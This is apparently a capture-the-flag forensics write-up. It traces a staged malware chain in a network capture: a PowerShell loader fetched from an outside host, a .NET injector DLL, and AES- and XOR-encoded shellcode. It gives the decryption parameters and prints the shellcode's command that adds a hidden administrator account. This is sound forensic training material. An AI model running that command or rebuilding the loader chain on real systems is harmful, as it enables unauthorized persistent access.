---
ctf: HTBLabs
title: Red Failure
category: forensics
difficulty: unknown
tags: []
flag_format: HTB{...}
date: 2026-08-10
---

# Red Failure

## Challenge
During a recent red team engagement one of our servers got compromised. Upon completion the red team should have deleted any malicious artifact or persistence mechanism used throughout the project. However, our engineers have found numerous of them left behind. It is therefore believed that there are more such mechanisms still active. Can you spot any, by investigating this network capture?

## Approach

1. Inspect the PCAP and list its TCP conversations. The suspicious host
   `147.182.172.189:80` serves three files over HTTP: `4A7xH.ps1`,
   `user32.dll`, and `9tVI0`.
2. Export the HTTP objects with `tshark --export-objects http,<dir>`.
3. Deobfuscate `4A7xH.ps1`. It loads `user32.dll` as a .NET assembly and uses
   it to fetch and inject `9tVI0`. The constructed password is
   `z64&Rx27Z$B%73up`.
4. Decompile `user32.dll`. `DInjector.AES` hashes the password with SHA-256,
   treats the first 16 payload bytes as the IV, and decrypts the rest with
   AES-256-CBC/PKCS7.
5. The decrypted 313-byte payload starts with a polymorphic x86 decoder. Its
   loop decodes 72 DWORDs at offset `0x19`, starting with key `0x53d07c47`;
   for each DWORD, XOR it with the current key, then add the plaintext DWORD
   to the key.
6. The decoded shellcode contains the persistence command:
   `net user jmiller "HTB{redacted}" /add; net localgroup administrators jmiller /add`.

## Tools

- `tshark`
- `ilspycmd`
- `openssl`
- `objdump`, `strings`, and `xxd`

## Lessons

- HTTP object extraction can recover the complete staged malware chain.
- Decompiling a managed loader reveals exact cryptographic parameters much
  more reliably than guessing from ciphertext.
- The remaining payload used a self-modifying x86 decoder, so its embedded
  command only became visible after emulating the DWORD decode loop.

## Flag

`HTB{redacted}`
